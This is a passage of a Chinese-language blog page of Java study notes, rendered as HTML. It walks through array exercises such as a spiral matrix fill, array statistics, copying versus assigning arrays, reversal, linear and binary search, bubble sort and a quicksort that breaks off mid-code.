class="comment">//向下</span></span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (i&lt;=maxi &amp;&amp; arr[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">                     arr[i++][j]=n++;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    k=<span class="number">3</span>;</span><br><span class="line">                    i--;</span><br><span class="line">                    j--;</span><br><span class="line">                    maxi--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//向左</span></span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;=minj &amp;&amp; arr[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">                    arr[i][j--]=n++;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    k=<span class="number">4</span>;</span><br><span class="line">                    j++;</span><br><span class="line">                    i--;</span><br><span class="line">                    minj++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//向上</span></span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">4</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i&gt;=mini &amp;&amp; arr[i][j]==<span class="number">0</span>)&#123;</span><br><span class="line">                    arr[i--][j]=n++;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    k=<span class="number">1</span>;</span><br><span class="line">                    i++;</span><br><span class="line">                    j++;</span><br><span class="line">                    mini++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;num;j++)&#123;</span><br><span class="line">                System.out.print(arr[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数值型数组中的元素的最大，最小，平均数，总和等"><a href="#数值型数组中的元素的最大，最小，平均数，总和等" class="headerlink" title="数值型数组中的元素的最大，最小，平均数，总和等"></a>数值型数组中的元素的最大，最小，平均数，总和等</h4><p>定义一个int型的一维数组，包含10个元素，分别赋一些随机整数，然后求出所有元素的最大值，最小值，和值，要求:所有随机数都是两位数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayExer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            arr[i]=(<span class="keyword">int</span>) (Math.random()*<span class="number">90</span>+<span class="number">10</span>); <span class="comment">//[10,99]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.print(arr[i]+<span class="string">&quot;  &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//求数组元素的最大值</span></span><br><span class="line">        <span class="keyword">int</span> maxValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(maxValue&lt;arr[i])&#123;</span><br><span class="line">                maxValue=arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;最大值为：&quot;</span>+maxValue);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//求数组元素的最小值</span></span><br><span class="line">        <span class="keyword">int</span> minValue = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(minValue&gt;arr[i])&#123;</span><br><span class="line">                minValue=arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;最小值为：&quot;</span>+minValue);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//求数组元素的总和</span></span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;总和为：&quot;</span>+sum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 求数组元素的平均数</span></span><br><span class="line">        <span class="keyword">int</span> average = sum/arr.length;</span><br><span class="line">        System.out.println(<span class="string">&quot;平均数为:&quot;</span>+average);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="数组的赋值，反转，查找（线性查找，二分法查找）"><a href="#数组的赋值，反转，查找（线性查找，二分法查找）" class="headerlink" title="数组的赋值，反转，查找（线性查找，二分法查找）"></a>数组的赋值，反转，查找（线性查找，二分法查找）</h4><p>一、赋值与复制</p>
<p>使用简单数组<br>(1)创建一个名为ArrayTest的类，在main()方 法中声明array1和array2两个变量，他们是int[]类型的数组。<br>(2)使用大括号{}， 把array1初始化为8个素数: 2,3,5,7,11,13,17,19.<br>(3)显示array1的内容。<br>(4)<strong>赋值</strong>array2变量等于array1,修改array2中的偶索引元素，使其等于索引值(如array[0]=0,array[2]=2)。 打印出array1<br>思考: array1和array2是什么关 系?</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayExer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array1 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] array2;</span><br><span class="line">        System.out.print(<span class="string">&quot;array1为：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt; array1.length;i++)&#123;</span><br><span class="line">            System.out.print(array1[i]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//赋值,不能称作数组的复制</span></span><br><span class="line">        array2=array1;</span><br><span class="line">        <span class="comment">//修改array2中的偶索引元素</span></span><br><span class="line">        System.out.print(<span class="string">&quot;array2为：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; array2.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                array2[i]=i;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(array2[i]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.print(<span class="string">&quot;修改array2后array1为：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt; array1.length;i++)&#123;</span><br><span class="line">            System.out.print(array1[i]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">array1为：<span class="number">2</span>	<span class="number">3</span>	<span class="number">5</span>	<span class="number">7</span>	<span class="number">11</span>	<span class="number">13</span>	<span class="number">17</span>	<span class="number">19</span>	</span><br><span class="line">array2为：<span class="number">0</span>	<span class="number">3</span>	<span class="number">2</span>	<span class="number">7</span>	<span class="number">4</span>	<span class="number">13</span>	<span class="number">6</span>	<span class="number">19</span>	</span><br><span class="line">修改array2后array1为：<span class="number">0</span>	<span class="number">3</span>	<span class="number">2</span>	<span class="number">7</span>	<span class="number">4</span>	<span class="number">13</span>	<span class="number">6</span>	<span class="number">19</span>	</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/13/JAVA/image-20220423171515706.png" alt="image-20220423171515706"></p>
<p>array1和array2是什么关系? array1和array2地址值相同，都指向了堆空间的唯一 的一个数组实体。</p>
<p>实现array2对array1的复制：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayExer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array1 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] array2;</span><br><span class="line">        System.out.print(<span class="string">&quot;array1为：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt; array1.length;i++)&#123;</span><br><span class="line">            System.out.print(array1[i]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//数组复制：new了一个新的数组</span></span><br><span class="line">        array2=<span class="keyword">new</span> <span class="keyword">int</span>[array1.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; array2.length;i++)&#123;</span><br><span class="line">            array2[i]=array1[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改array2中的偶索引元素</span></span><br><span class="line">        System.out.print(<span class="string">&quot;修改后的array2为：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; array2.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                array2[i]=i;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(array2[i]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.print(<span class="string">&quot;修改array2后array1为：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt; array1.length;i++)&#123;</span><br><span class="line">            System.out.print(array1[i]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">array1为：<span class="number">2</span>	<span class="number">3</span>	<span class="number">5</span>	<span class="number">7</span>	<span class="number">11</span>	<span class="number">13</span>	<span class="number">17</span>	<span class="number">19</span>	</span><br><span class="line">修改后的array2为：<span class="number">0</span>	<span class="number">3</span>	<span class="number">2</span>	<span class="number">7</span>	<span class="number">4</span>	<span class="number">13</span>	<span class="number">6</span>	<span class="number">19</span>	</span><br><span class="line">修改array2后array1为：<span class="number">2</span>	<span class="number">3</span>	<span class="number">5</span>	<span class="number">7</span>	<span class="number">11</span>	<span class="number">13</span>	<span class="number">17</span>	<span class="number">19</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/13/JAVA/image-20220423172436418.png" alt="image-20220423172436418"></p>
<p>二、反转</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayExer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] arr = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;JJ&quot;</span>,<span class="string">&quot;DD&quot;</span>,<span class="string">&quot;MM&quot;</span>,<span class="string">&quot;BB&quot;</span>,<span class="string">&quot;AA&quot;</span>,<span class="string">&quot;GG&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//数组的反转</span></span><br><span class="line"><span class="comment">//        for(int i=0;i&lt; arr.length/2;i++)&#123;</span></span><br><span class="line"><span class="comment">//            String temp =arr[i];</span></span><br><span class="line"><span class="comment">//            arr[i]=arr[arr.length-1-i];</span></span><br><span class="line"><span class="comment">//            arr[arr.length-1-i]=temp;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j= arr.length-<span class="number">1</span>;i&lt;j;i++,j--)&#123;</span><br><span class="line">            String temp =arr[i];</span><br><span class="line">            arr[i]=arr[j];</span><br><span class="line">            arr[j]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.print(arr[i]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>三、线性查找</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayExer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] arr = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;JJ&quot;</span>,<span class="string">&quot;DD&quot;</span>,<span class="string">&quot;MM&quot;</span>,<span class="string">&quot;BB&quot;</span>,<span class="string">&quot;AA&quot;</span>,<span class="string">&quot;GG&quot;</span>&#125;;</span><br><span class="line">        String desc = <span class="string">&quot;BB&quot;</span>;</span><br><span class="line">        <span class="keyword">boolean</span> isFlag =<span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt; arr.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(desc.equals(arr[i]))&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;找到了指定的元素，位置为：&quot;</span>+i);</span><br><span class="line">                isFlag=<span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(isFlag)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;很遗憾，你没有找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>二分法查找：</strong></p>
<p>前提：<strong>所要查找的数组必须有序</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayExer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">98</span>,-<span class="number">34</span>,<span class="number">2</span>,<span class="number">34</span>,<span class="number">54</span>,<span class="number">66</span>,<span class="number">79</span>,<span class="number">105</span>,<span class="number">210</span>,<span class="number">333</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> dest = -<span class="number">34</span>;</span><br><span class="line">        <span class="keyword">int</span> head = <span class="number">0</span>; <span class="comment">//初始的首索引</span></span><br><span class="line">        <span class="keyword">int</span> end =arr.length-<span class="number">1</span>; <span class="comment">//初始的末索引</span></span><br><span class="line">        <span class="keyword">boolean</span> isFlag=<span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (head&lt;=end)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid =(head+end)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(dest==arr[mid])&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;找到了指定元素，索引位置为：&quot;</span>+mid);</span><br><span class="line">                isFlag=<span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dest&gt;arr[mid])&#123;</span><br><span class="line">                head=mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                end=mid-<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(isFlag)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;很遗憾，你没有找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>衡量排序算法的优劣:<br>1.时间复杂度:分析关键字的比较次数和记录的移动次数<br>2.空间复杂度:分析排序算法中需要多少辅助内存<br>3.稳定性:若两个记录A和B的关键字值相等，但排序后A、B的先后次序保持不变，则称这种排序算法是稳定的。</p>
<p>排序算法分类:内部排序和外部排序。<br>➢内部排序:整个排序过程不需要借助于外部存储器(如磁盘等)，所有排序操作都在内存中完成。<br>➢外部排压:参与排序的数据非常多，数据量非常大，计算机无法把整个排序过程放在内存中完成，必须借助于外部存储器(如磁盘)。外部排序最常见的是多路归并排序。可以认为外部排序是由多次内部排序组成。</p>
<p>十大内部排序算法<br>●选择排序<br>    ➢直接选择排序、堆排序<br>●交换排序<br>    ➢冒泡排序、快速排序<br>●插入排序<br>    ➢直接插入排序、折半插入排序、Shell排序<br>●归并排序<br>●桶式排序<br>●基数排序</p>
<p><img src="/2022/04/13/JAVA/image-20220423215600106.png" alt="image-20220423215600106"></p>
<p>冒泡排序：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"><span class="comment">//数组的冒泡排序的实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BubbleSortTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">43</span>,<span class="number">32</span>,<span class="number">76</span>,-<span class="number">98</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">33</span>,-<span class="number">21</span>,<span class="number">32</span>,<span class="number">99</span>&#125;;</span><br><span class="line">      <span class="comment">//冒泡排序,从小到大</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length-<span class="number">1</span>;i++)&#123;   <span class="comment">//轮数,减一的原因是，最后一轮就是最后一个数据，不用比较</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt; arr.length-<span class="number">1</span>-i;j++)&#123; <span class="comment">//每一轮比较次数</span></span><br><span class="line">                <span class="keyword">if</span>(arr[j]&gt;arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="keyword">int</span> temp =arr[j];</span><br><span class="line">                    arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">                    arr[j+<span class="number">1</span>]=temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">            System.out.print(arr[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>快速排序：时间复杂度为O(nlog(n))</p>
<p>快速排序是一种基于分而治之的排序算法，其中： 1、通过从数组中选择一个中心元素将数组划分成两个子数组，在划分数组时，将比中心元素小的元素放在左子数组，将比中心元素大的元素放在右子数组。 2、左子数组和右子数组也使用相同的方法进行划分，这个过程一直持续到每个子数组都包含一个元素为止。 3、最后，将元素组合在一起以形成排序的数组。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] quickSort(<span class="keyword">int</span> arr[],<span class="keyword">int</span> left,<span class="keyword">int</span> right) &#123;</span><br><span class="line">    <span class="keyword">int</span> pivot = arr[left];<span class="comment">//轴值</span></span><br><span class="line">    <span class="keyword">int</span> i = left;<span class="comment">//左下标</span></span><br><span class="line">    <span class="keyword">int</span> j = right;<span class="comment">//右下标</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        <span class="comment">//在右边找到一个比中值小或者相等的值</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[j] &gt; pivot) &#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;<span class="comment">//先从右边开始</span></span><br><span class="line">        <span class="comment">//在左边找到一个比中值大或者相等的值</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[i] &lt; pivot) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//在i和j没有相遇时，如果 arr[i] == arr[j] 此时让i+1</span></span><br><span class="line">        <span class="comment">//即让arr[i+1] 与arr[j]进行交换 ，使两个相同的数在一起</span></span><br><span class="line">        <span class="keyword">if</span> (arr[i] == arr[j] &amp;&amp; i &lt; j) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//交换</span></span><br><span class="line">            <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">            arr[i] = arr[j];</span><br><span class="line">            arr[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//左半部递归</span></span><br><span class="line">    <span class="keyword">if</span> (i-<span class="number">1</span> &gt; left) &#123;</span><br><span class="line">        arr=quickSort(arr,left,i-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//右半部递归</span></span><br><span class="line">    <span class="keyword">if</span> 